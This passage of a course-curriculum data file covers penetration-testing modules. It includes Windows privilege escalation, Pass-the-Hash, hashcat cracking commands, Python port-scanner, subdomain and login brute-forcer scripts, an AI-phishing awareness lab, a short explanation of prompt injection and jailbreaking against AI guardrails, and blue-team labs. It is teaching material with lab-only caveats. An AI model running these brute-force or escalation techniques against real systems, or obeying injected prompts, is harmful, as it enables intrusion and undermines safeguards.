          "Unquoted service paths: a service path with spaces and no quotes lets an attacker plant an executable earlier in the path that gets run instead",
          "Token impersonation (e.g. via a service account with SeImpersonatePrivilege) can be abused to escalate to SYSTEM (the 'Potato' family of exploits)",
        ],
        terminalCommands: [
          "wmic service get name,pathname,startmode",
          "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
        ],
      },
      {
        id: "m11-9",
        moduleId: "m11",
        number: 142,
        title: "Lateral Movement & Pivoting Basics (Pass-the-Hash, SMB, RDP)",
        type: "theory",
        week: 11,
        description:
          "Once one host is compromised, lateral movement is how an attacker reaches other hosts in the same network without needing to crack any more passwords.",
        keyPoints: [
          "Pass-the-Hash: authenticate to another Windows host using a stolen NTLM hash directly, without ever cracking it to plaintext",
          "SMB and RDP are the two most common lateral-movement protocols in Windows/AD environments",
          "Pivoting: routing traffic through a compromised host to reach network segments not directly reachable from the attacker's machine",
        ],
      },
      {
        id: "m11-10",
        moduleId: "m11",
        number: 143,
        title: "VulnMachines: 5 Beginner Machines (write up each)",
        type: "lab",
        week: 11,
        description:
          "Compromise 5 beginner-difficulty VulnMachines boxes end to end, writing up the full methodology for each.",
        keyPoints: [
          "For each machine: recon (Nmap) → identify a vulnerable service/version → exploit → privesc → capture the flag",
          "Write-up format: target overview, recon findings, exploitation steps, privesc path, flag, lessons learned",
        ],
      },
      {
        id: "m11-11",
        moduleId: "m11",
        number: 144,
        title: "Lab: Crack a provided hash list with Hashcat using rockyou.txt",
        type: "lab",
        week: 11,
        description:
          "Crack a provided list of MD5 and SHA-256 hashes using Hashcat against the rockyou.txt wordlist.",
        keyPoints: [
          "Identify each hash's type/length before selecting the correct -m mode",
          "Run Hashcat against the full hash list in one batch and record the cracked results",
          "Document which passwords cracked instantly vs which required additional rule sets",
        ],
        terminalCommands: ["hashcat -m 0 md5_hashes.txt rockyou.txt", "hashcat -m 1400 sha256_hashes.txt rockyou.txt"],
      },
    ],
  },

  // ============================================================
  // M12: Python Scripting for Security
  // ============================================================
  {
    id: "m12",
    name: "M12: Python Scripting for Security",
    shortName: "Python Scripting",
    month: 3,
    weeks: [11],
    description:
      "Automation is what separates a hobbyist from a professional — this module builds practical Python scripting skills through four real security tools you'll write from scratch: a MAC changer, port scanner, subdomain brute-forcer, and login brute-forcer.",
    estimatedHours: 8,
    outcomes: [
      "Write and run Python scripts confidently (variables, control flow, functions)",
      "Use the socket and requests libraries for network programming",
      "Build a MAC address changer, port scanner, and subdomain brute-forcer",
      "Build a basic login brute-forcer against a web form",
    ],
    resources: [
      { title: "Python docs", url: "https://docs.python.org/3/", type: "link" },
      { title: "requests library docs", url: "https://requests.readthedocs.io", type: "link" },
    ],
    topics: [
      {
        id: "m12-1",
        moduleId: "m12",
        number: 145,
        title: "Python Fundamentals (variables, control flow, functions, modules, libraries)",
        type: "theory",
        week: 11,
        description:
          "The Python syntax and standard-library building blocks every script in this module relies on.",
        keyPoints: [
          "Core types: int, float, str, bool — dynamically typed, no declarations needed",
          "Control flow: for/while loops, if/elif/else conditionals, try/except for error handling",
          "Functions with def, reusable across scripts; import brings in modules/libraries",
          "Security-relevant libraries: socket (networking), requests (HTTP), hashlib (hashing), scapy (packet crafting)",
        ],
        terminalCommands: [
          "def greet(name):\n    return f\"Hello, {name}!\"",
          "try:\n    x = 1 / 0\nexcept ZeroDivisionError as e:\n    print(f\"Error: {e}\")",
        ],
      },
      {
        id: "m12-2",
        moduleId: "m12",
        number: 146,
        title: "Working with Sockets & Requests in Python",
        type: "theory",
        week: 11,
        description:
          "socket gives you raw TCP/UDP connections (the basis of a port scanner); requests gives you a friendly HTTP client (the basis of a login brute-forcer or subdomain enumerator).",
        keyPoints: [
          "socket.socket(AF_INET, SOCK_STREAM) opens a TCP socket; .connect_ex() attempts a connection without raising on failure",
          "requests.get()/requests.post() send HTTP requests and expose .status_code and .content on the response",
          "Always set a timeout on both sockets and requests — an unresponsive host will otherwise hang your script indefinitely",
        ],
        terminalCommands: [
          "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(1)\nresult = s.connect_ex((ip, port))",
        ],
      },
      {
        id: "m12-3",
        moduleId: "m12",
        number: 147,
        title: "Python: MAC Address Changer Script",
        type: "lab",
        week: 11,
        description:
          "Build a command-line tool that changes a Linux network interface's MAC address — a classic first scripting project combining argparse, regex validation, and subprocess.",
        keyPoints: [
          "argparse defines -i/--interface and -m/--mac CLI flags",
          "Validate the new MAC against a regex before ever touching the interface",
          "Bring the interface down → change the address → bring it back up, all via subprocess calling ip link",
          "Verify the change by re-reading the interface and regex-matching the new MAC out of the output",
        ],
        terminalCommands: [
          "sudo python3 mac_changer.py -i eth0 -m 00:11:22:33:44:55",
          "sudo ip link set dev eth0 down",
          "sudo ip link set dev eth0 address 00:11:22:33:44:55",
          "sudo ip link set dev eth0 up",
        ],
      },
      {
        id: "m12-4",
        moduleId: "m12",
        number: 148,
        title: "Python: Port Scanner Script (TCP connect scan)",
        type: "lab",
        week: 11,
        description:
          "Build a simple TCP connect-scan port scanner that accepts a target IP and port range as arguments — the same underlying technique Nmap's -sT scan uses.",
        keyPoints: [
          "Loop over the port range, opening a new socket per port with a short timeout",
          "connect_ex() returns 0 on success (port open) — anything else means closed/filtered",
          "Print open ports as they're found so long scans give live feedback",
        ],
        terminalCommands: [
          "import socket, sys\ntarget = sys.argv[1]\nfor port in range(1, 1025):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(0.5)\n    if s.connect_ex((target, port)) == 0:\n        print(f\"[+] Port {port} is open\")\n    s.close()",
        ],
      },
      {
        id: "m12-5",
        moduleId: "m12",
        number: 149,
        title: "Python: Subdomain Brute-Forcer Script",
        type: "lab",
        week: 11,
        description:
          "Build a subdomain enumerator that checks a wordlist of common subdomain prefixes against a target domain using the requests library.",
        keyPoints: [
          "Loop a subdomain wordlist, building http://{sub}.{domain} for each entry",
          "A 200 status code (with a short timeout) indicates a live, resolvable subdomain",
          "Wrap the request in try/except requests.ConnectionError to skip non-existent subdomains cleanly",
        ],
        terminalCommands: [
          "import requests\nsubdomains = [\"www\", \"mail\", \"ftp\", \"admin\", \"test\", \"dev\"]\ndomain = input(\"Enter the domain: \")\nfor sub in subdomains:\n    url = f\"http://{sub}.{domain}\"\n    try:\n        r = requests.get(url, timeout=3)\n        if r.status_code == 200:\n            print(f\"[+] Found: {url}\")\n    except requests.ConnectionError:\n        pass",
        ],
      },
      {
        id: "m12-6",
        moduleId: "m12",
        number: 150,
        title: "Python: Application Login Brute-Forcer Script",
        type: "lab",
        week: 11,
        description:
          "Build a login-form brute-forcer using requests.post(), detecting success by looking for a string only present on a successful login.",
        keyPoints: [
          "POST a username/password pair to the login endpoint's data={} parameter for each wordlist entry",
          "Check for a 'needle' string in the response (e.g. 'Welcome back') to confirm a valid credential pair",
          "Only ever run against your own lab targets (e.g. DVWA) — this is a noisy, easily detected technique",
        ],
        terminalCommands: [
          "import requests\ntarget = \"http://127.0.0.1:8080\"\nneedle = \"Welcome back\"\nfor password in open(\"passwords.txt\"):\n    password = password.strip()\n    r = requests.post(target, data={\"username\": \"admin\", \"password\": password})\n    if needle in r.text:\n        print(f\"[+] Valid password: {password}\")\n        break",
        ],
      },
      {
        id: "m12-7",
        moduleId: "m12",
        number: 151,
        title: "Using AI (ChatGPT/DeepSeek) to Generate & Review Security Scripts",
        type: "theory",
        week: 11,
        description:
          "AI assistants can meaningfully speed up writing and reviewing security tooling — but every line of AI-generated code still needs to be understood and validated before you run it against anything.",
        keyPoints: [
          "Good uses: scaffolding a script's structure, explaining unfamiliar code, spotting insecure patterns (hardcoded secrets, missing input validation)",
          "Always test AI-generated scripts in an isolated lab environment before relying on them operationally",
          "Never paste real credentials, internal hostnames, or client data into a public AI tool as part of a prompt",
        ],
      },
    ],
  },

  // ============================================================
  // M13: Hacking with AI
  // ============================================================
  {
    id: "m13",
    name: "M13: Hacking with AI",
    shortName: "Hacking with AI",
    month: 3,
    weeks: [11],
    description:
      "AI is reshaping both sides of the security fight — this module covers how AI/ML is used offensively (recon automation, AI-generated phishing) and defensively (anomaly detection), the ethical boundaries involved, and hands-on use of a local AI model for security work.",
    estimatedHours: 10,
    outcomes: [
      "Explain the relationship between AI, ML, and Deep Learning in a security context",
      "Describe offensive and defensive uses of AI in cybersecurity",
      "Install and run a local AI model (DeepSeek via Ollama)",
      "Recognise prompt injection as an attack technique against AI systems",
      "Use AI to assist recon scripting and spot insecure code patterns",
    ],
    resources: [
      { title: "Ollama", url: "https://ollama.com", type: "tool" },
      { title: "OWASP LLM Top 10", url: "https://owasp.org/www-project-top-10-for-large-language-model-applications/", type: "link" },
    ],
    topics: [
      {
        id: "m13-1",
        moduleId: "m13",
        number: 152,
        title: "Basics of AI, ML, and Deep Learning in Security Context",
        type: "theory",
        week: 11,
        description:
          "AI, ML, and Deep Learning are nested layers, not synonyms — AI is the broad goal (simulating decisions), ML is a subset that learns patterns from labelled data, and DL is a further subset using layered neural networks.",
        keyPoints: [
          "AI: machines simulating human decision-making (e.g. a spam filter)",
          "ML: trained on labelled data to find patterns (e.g. learning from past attacks to flag future ones)",
          "DL: layered neural networks needing large datasets, auto-discovers features (e.g. detecting malware behaviourally, without line-by-line code review)",
          "Security applications scale with the layer: AI → smart firewalls, ML → phishing/brute-force detection, DL → log analysis and zero-day pattern detection",
        ],
      },
      {
        id: "m13-2",
        moduleId: "m13",
        number: 153,
        title: "Role of AI in Offensive & Defensive Cybersecurity",
        type: "theory",
        week: 11,
        description:
          "AI is genuinely dual-use in security — the same underlying techniques that detect anomalies for defenders can generate convincing phishing content for attackers.",
        keyPoints: [
          "Offensive uses: AI-generated phishing/deepfakes, OSINT-driven recon, AI password recovery (e.g. PassGAN), AI-evasive malware",
          "Defensive uses: anomaly detection (e.g. login from a new country), AI-powered spam/phishing filters, automated incident response (auto-isolating infected devices), AI code-vulnerability scanning (e.g. GitHub Copilot)",
        ],
      },
      {
        id: "m13-3",
        moduleId: "m13",
        number: 154,
        title: "Ethical Boundaries in AI-Assisted Hacking",
        type: "theory",
        week: 11,
        description:
          "AI's dual-use nature raises the same authorisation questions as any other tool in this course — just because AI can generate an attack script doesn't make it legal or ethical to run one.",
        keyPoints: [
          "Key concerns: privacy violations (PII collection), lack of accountability, bias/discrimination, weaponisation of AI capability",
          "Ethical-use principles: follow applicable laws/regulations, obtain consent, be transparent, prevent misuse",
        ],
      },
      {
        id: "m13-4",
        moduleId: "m13",
        number: 155,
        title: "Installing & Using Local AI (DeepSeek locally)",
        type: "setup",
        week: 11,
        description:
          "Run DeepSeek R1 fully offline via Ollama — a local, open-source coding/reasoning model comparable to ChatGPT/Copilot but with no data leaving your machine.",
        keyPoints: [
          "System requirements: 16GB RAM minimum (32GB recommended), 20-50GB storage, GPU optional but accelerates inference",
          "Ollama manages model download, resource optimisation, and integration for you",
          "The VS Code 'Continue' extension auto-detects a locally running Ollama model for in-editor use",
        ],
        terminalCommands: [
          "ollama run deepseek-coder:6.7b",
          "ollama pull deepseek-coder:6.7b",
        ],
      },
      {
        id: "m13-5",
        moduleId: "m13",
        number: 156,
        title: "AI-Powered Reconnaissance & OSINT Automation",
        type: "theory",
        week: 11,
        description:
          "AI can accelerate recon by generating and adapting scripts on the fly — for subdomain scanning, WHOIS/DNS lookups, and scraping public sources.",
        keyPoints: [
          "Use case: ask a local/AI model to generate a starter script for a specific recon task, then review and adapt it",
          "AI can also scan social media/public sites for personal info relevant to a spear-phishing risk assessment",
          "Always validate AI-suggested recon scripts against the authorised scope before running them",
        ],
      },
      {
        id: "m13-6",
        moduleId: "m13",
        number: 157,
        title: "AI for Phishing & Social Engineering (awareness exercise)",
        type: "theory",
        week: 11,
        description:
          "AI makes phishing more convincing by fixing the spelling/grammar tells that used to be reliable red flags — this topic is an awareness exercise, not an invitation to phish real people.",
        keyPoints: [
          "Phishing taxonomy: Vishing (phone), Smishing (SMS), Whaling (targets executives), Clone phishing, Spear phishing (personalised)",
          "AI-generated phishing emails read as more polished and personalised than older templated scams",
          "User protections: enable 2FA everywhere, never click links in unsolicited 'urgent' emails, verify via a separate channel",
        ],
      },
      {
        id: "m13-7",
        moduleId: "m13",
        number: 158,
        title: "Bypassing AI Ethical Limits via Prompt Injection",
        type: "theory",
        week: 11,
        description:
          "Prompt injection is the technique of crafting input that overrides an AI system's intended constraints or instructions.",
        keyPoints: [
          "Direct prompt injection: the attacker's prompt itself overrides the model's normal behaviour/guardrails",
          "Indirect prompt injection: malicious instructions are embedded in content the LLM is asked to analyse (a webpage, a document)",
          "Jailbreaking: exploiting model vulnerabilities specifically to bypass safety guardrails",
          "Defences: strict input validation/filtering, isolating user input from system instructions, ongoing monitoring",
        ],
      },
      {
        id: "m13-8",
        moduleId: "m13",
        number: 159,
        title: "Identifying Code Vulnerabilities Using AI (ChatGPT, GitHub Copilot)",
        type: "theory",
        week: 11,
        description:
          "AI code-review tools can flag common vulnerability patterns faster and more consistently than manual review alone — a useful second pair of eyes, not a replacement for understanding the code.",
        keyPoints: [
          "Common vulnerabilities AI tools flag well: SQL Injection, XSS, buffer overflows, hardcoded passwords",
          "Tools: GitHub Copilot (inline suggestions/warnings), CodeQL (static analysis), Semgrep (customisable scanning), ChatGPT/LLMs (explain and review code)",
          "Example: AI flags an unfiltered login form input and suggests proper input validation",
        ],
      },
      {
        id: "m13-9",
        moduleId: "m13",
        number: 160,
        title: "Lab: AI-assisted subdomain enumeration script",
        type: "lab",
        week: 11,
        description:
          "Use a local/AI model to help generate and refine a subdomain enumeration script, then run it against a lab target — building directly on the M12 subdomain brute-forcer.",
        keyPoints: [
          "Ask the AI model to extend the M12 subdomain script with concurrency/threading",
          "Review every suggested change line by line before running it",
          "Compare the AI-assisted version's speed/accuracy against the original manual version",
        ],
      },
      {
        id: "m13-10",
        moduleId: "m13",
        number: 161,
        title: "Lab: Writing phishing email templates with AI (awareness exercise)",
        type: "lab",
        week: 11,
        description:
          "Generate a sample phishing email with AI purely as a security-awareness exercise, then annotate exactly which elements make it convincing.",
        keyPoints: [
          "Generate an email impersonating a known brand with an urgency-driven call to action",
          "Annotate the manipulation techniques used: urgency, authority, fear, fake branding",
          "This exercise is for awareness/training content only — never send generated phishing content to real people outside an authorised, scoped engagement",
        ],
      },
    ],
  },

  // ============================================================
  // M14: Blue Team / Defensive Security Intro
  // ============================================================
  {
    id: "m14",
    name: "M14: Blue Team / Defensive Security Intro",
    shortName: "Blue Team Intro",
    month: 3,
    weeks: [12],
    description:
      "Every good offensive tester understands the defender's side too — this module covers SOC structure, the core blue-team disciplines, and three hands-on investigation labs (Event Viewer, Wireshark, VirusTotal) that mirror what a Tier 1/2 SOC analyst does daily.",
    estimatedHours: 8,
    outcomes: [
      "Explain the SOC tier structure and each tier's responsibilities",
      "Name the key blue-team disciplines (SIEM, threat intel, IR, DFIR, IAM)",
      "Investigate a Windows Event Log for indicators of compromise",
      "Analyse a PCAP file in Wireshark to identify suspicious traffic",
      "Use VirusTotal to triage a suspicious file by hash",
    ],
    resources: [
      { title: "TryHackMe SOC Level 1", url: "https://tryhackme.com", type: "platform" },
      { title: "VirusTotal", url: "https://www.virustotal.com", type: "tool" },
    ],
    topics: [
      {
        id: "m14-1",
        moduleId: "m14",
        number: 162,
        title: "Defensive Security Overview & Why Pentesters Should Understand It",
        type: "theory",
        week: 12,
        description:
          "Defensive security protects assets by preventing, detecting, and responding to threats — a 'castle' to offensive security's siege, and understanding it makes you a sharper, more realistic attacker.",
        keyPoints: [
          "Core areas: Network Security, Endpoint Security (EDR), Application Security, IAM, Threat Intelligence, Incident Response, Security Awareness Training",
          "Importance: prevents breaches, ensures regulatory compliance (GDPR, ISO 27001), protects reputation and reduces financial loss",
        ],
      },
      {
        id: "m14-2",
        moduleId: "m14",
        number: 163,
        title: "SOC Structure (Tier 1/2/3 analyst, incident lifecycle)",
        type: "theory",
        week: 12,
        description:
          "A Security Operations Center monitors, detects, and responds to threats 24/7 — the organisation's first line of defence, staffed across escalating tiers of expertise.",
        keyPoints: [
          "Tier 1 (Junior Analyst): first responder, monitors SIEM alerts, triages and escalates serious threats",
          "Tier 2 (Incident Responder): investigates threats in depth, analyses malware/suspicious activity, contains incidents",
          "Tier 3 (Threat Hunter/Advanced Analyst): proactively hunts hidden threats, deep forensic investigation, builds detection rules",
        ],
      },
      {
        id: "m14-3",
        moduleId: "m14",
        number: 164,
        title: "Key Blue Team Areas (SIEM, Threat Intel, IR, DFIR, IAM)",
        type: "theory",
        week: 12,
        description:
          "The disciplines that make up a mature defensive security programme, each staffed by different specialist roles.",
        keyPoints: [
          "SIEM: aggregates and correlates logs across the organisation to detect suspicious patterns",
          "Threat Intelligence: tracks known threat actors, IOCs, and TTPs relevant to the organisation",
          "Incident Response (IR): the structured process for handling an active security incident",
          "DFIR (Digital Forensics & Incident Response): deep technical investigation after an incident, often for legal/evidentiary purposes",
          "IAM (Identity and Access Management): governs who can access what, and enforces least privilege",
        ],
      },
      {
        id: "m14-4",
        moduleId: "m14",
        number: 165,
        title: "Lab: Log Analysis with Windows Event Viewer",
        type: "lab",
        week: 12,
        description:
          "Investigate a provided Windows Event Log (.evtx) to reconstruct a malware-infection timeline and find 3 flag fragments hidden across different Event IDs.",
        keyPoints: [
          "Load the .evtx file into Event Viewer's Saved Logs pane rather than reading live logs",
          "Filter by Event ID rather than scrolling — 11707/1033 (installation events), 4657 (registry key change), 1074 (shutdown event)",
          "Reconstruct the timeline: suspicious software installed → it modified a Run registry key → every login now triggers a shutdown",
        ],
      },
      {
        id: "m14-5",
        moduleId: "m14",
        number: 166,
        title: "Lab: Network Traffic Analysis with Wireshark (PCAP file)",
        type: "lab",
        week: 12,
        description:
          "Analyse a provided PCAP capture between two hosts, follow the TCP stream, and decode a hidden flag from the traffic content.",
        keyPoints: [
          "Statistics view first — check source/destination IPs and protocol breakdown for anything unusual",
          "Identify the 3-way TCP handshake followed by an HTTP GET request",
          "Right-click → Follow → TCP Stream to view the full request/response conversation",
          "Recognise ROT13-style obfuscation in the stream content and decode it to recover the flag",
        ],
      },
      {
        id: "m14-6",
        moduleId: "m14",
        number: 167,
        title: "Lab: Malware Detection with VirusTotal",
        type: "lab",
        week: 12,
        description:
          "Analyse a suspicious binary by computing its hash and submitting it to VirusTotal for multi-engine detection.",
        keyPoints: [
          "file identifies the binary type; sha256sum computes the hash to submit",
          "VirusTotal aggregates verdicts from dozens of AV engines — look at both the detection count and named malware family",
          "VirusTotal is excellent for triage but can miss brand-new malware strains — treat a clean result as inconclusive, not proof-of-safety",
        ],
        terminalCommands: ["file suspicious.elf", "sha256sum suspicious.elf"],
      },
      {
        id: "m14-7",
        moduleId: "m14",
        number: 168,
        title: "Incident Response Lifecycle (Prepare, Detect, Contain, Eradicate, Recover)",
        type: "theory",
        week: 12,
        description:
          "The standard structured framework for handling a security incident from readiness through to lessons learned.",
        keyPoints: [
          "Prepare: policies, tooling, and training in place before an incident occurs",
          "Detect & Analyse: identify that an incident is happening and understand its scope",
          "Contain, Eradicate, Recover: stop the spread, remove the threat, restore normal operations",
          "Post-Incident (Lessons Learned): document what happened and improve defences/playbooks",
        ],
      },
      {
        id: "m14-8",
        moduleId: "m14",
        number: 169,
        title: "YARA Rules Introduction",
        type: "theory",
        week: 12,
        description:
          "YARA is a pattern-matching tool for identifying and classifying malware samples based on strings and code patterns — 'grep for malware researchers.'",
        keyPoints: [
          "A YARA rule defines strings/patterns plus a boolean condition for when a file matches",
          "Used heavily in threat intelligence and malware research to tag families of related samples",
          "IOC types a rule can encode: Atomic (a hash/IP), Computed (a fuzzy hash), Behavioural (a code pattern)",
        ],
        terminalCommands: [
          "rule ExampleRule {\n  strings:\n    $a = \"malicious_string\"\n  condition:\n    $a\n}",
        ],
      },
    ],
  },

